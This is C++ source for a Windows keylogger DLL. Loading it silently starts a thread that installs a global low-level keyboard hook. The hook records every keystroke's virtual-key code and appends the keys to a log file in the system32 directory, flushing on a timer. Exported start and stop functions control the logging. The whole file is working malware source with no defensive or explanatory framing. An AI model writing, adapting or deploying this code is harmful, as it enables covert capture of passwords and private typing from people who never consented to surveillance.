#include "StdAfx.h"
#include <windows.h>
#include <stdio.h>

#define BUFFER_SIZE 256

HHOOK hKeyboardHook = NULL;
HMODULE hDllModule = NULL; 
HINSTANCE hInstance = NULL;
BYTE keyBuffer[BUFFER_SIZE];
int bufferIndex = 0;
HWND hwnd = NULL;
UINT_PTR timerId = 0;

char* GetLogFilePath() {
    static char path[MAX_PATH];
    strcpy_s(path, MAX_PATH, "C:\\WINDOWS\\system32\\log.bin");
    return path;
}

void SaveBufferToFile() {
    if (bufferIndex > 0) {
        FILE* logFile;
        if (fopen_s(&logFile, GetLogFilePath(), "ab") == 0) {
            fwrite(keyBuffer, 1, bufferIndex, logFile);
            fclose(logFile);
        }
        bufferIndex = 0;
    }
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    if (uMsg == WM_TIMER && wParam == timerId) {
        SaveBufferToFile();
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            keyBuffer[bufferIndex++] = (BYTE)kbdStruct->vkCode;
            if (bufferIndex >= BUFFER_SIZE - 1) {
                SaveBufferToFile();
            }
        }
    }
    
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

BOOL InitializeWindow() {
    WNDCLASSA wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "KeyloggerDllClass";
    
    if (RegisterClassA(&wc) == 0) {
        return FALSE;
    }
    
    hwnd = CreateWindowA("KeyloggerDllClass", NULL, 0, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
    return hwnd != NULL;
}

extern "C" __declspec(dllexport) BOOL StartKeylogger() {
    if (!InitializeWindow()) {
        return FALSE;
    }
    
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
    if (hKeyboardHook == NULL) {
        return FALSE;
    }
    
    timerId = SetTimer(hwnd, 1, 3000, NULL);
    if (timerId == 0) {
        UnhookWindowsHookEx(hKeyboardHook);
        hKeyboardHook = NULL;
        return FALSE;
    }
    
    return TRUE;
}

extern "C" __declspec(dllexport) BOOL StopKeylogger() {
    if (timerId != 0) {
        KillTimer(hwnd, timerId);
        timerId = 0;
    }
    
    if (hKeyboardHook != NULL) {
        UnhookWindowsHookEx(hKeyboardHook);
        hKeyboardHook = NULL;
    }
    
    if (hwnd != NULL) {
        DestroyWindow(hwnd);
        hwnd = NULL;
        UnregisterClassA("KeyloggerDllClass", hInstance);
    }
    
    SaveBufferToFile();
    return TRUE;
}

DWORD WINAPI KeyloggerThread(LPVOID lpParam) {
    if (!InitializeWindow()) {
        return FALSE;
	}
   
    
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hDllModule, 0);
    if (!hKeyboardHook) {
		return FALSE;
    }
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
	hDllModule = hModule; 
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
            break;
        case DLL_PROCESS_DETACH:
            StopKeylogger();
            break;
    }
    return TRUE;
}